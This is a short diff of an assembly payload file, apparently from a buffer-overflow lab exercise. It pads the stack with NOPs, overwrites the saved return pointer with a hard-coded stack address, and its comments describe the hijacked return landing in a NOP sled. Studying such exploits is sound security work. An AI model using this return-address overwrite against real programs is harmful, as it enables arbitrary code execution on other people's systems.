@@ -1,8 +1,11 @@
 ; 32-bit mode. otherwise got wonky results (0x66 spammed in binary)
 bits 32
 
+; fill stuff before return pointer with nop
+times 36 nop
+
 ; jump to 0xbffff148 + 70
-times 10 dd 0xbffff18e
+dd 0xbffff18e
 
 ; more nops, JIC
 ; hijacked return should land in here somewhere
